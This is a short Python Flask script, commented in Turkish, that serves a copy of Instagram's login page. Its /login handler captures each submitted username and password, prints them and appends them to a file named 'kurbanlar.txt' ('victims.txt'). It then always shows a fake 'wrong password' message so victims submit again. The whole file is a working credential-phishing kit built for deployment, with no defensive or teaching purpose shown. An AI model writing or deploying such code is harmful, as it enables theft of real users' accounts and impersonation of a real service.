import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML_TASARIM = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .error { color: #ed4956; font-size: 14px; margin-bottom: 15px; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" alt="Instagram" class="logo">
        {% if hata %}
            <p class="error">Üzgünüz, şifren yanlıştı. Lütfen şifreni kontrol et.</p>
        {% endif %}
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <div class="divider">YA DA</div>
        <p style="color:#385185; font-size:14px; font-weight:bold; cursor:pointer; margin:0;">Facebook ile Giriş Yap</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TASARIM)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')
    print(f"--- BİLGİ GELDİ --- Kullanıcı: {user} | Şifre: {pw}")
    with open("kurbanlar.txt", "a") as f:
        f.write(f"Kullanici: {user} | Sifre: {pw}\\n")
    return render_template_string(HTML_TASARIM, hata=True)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
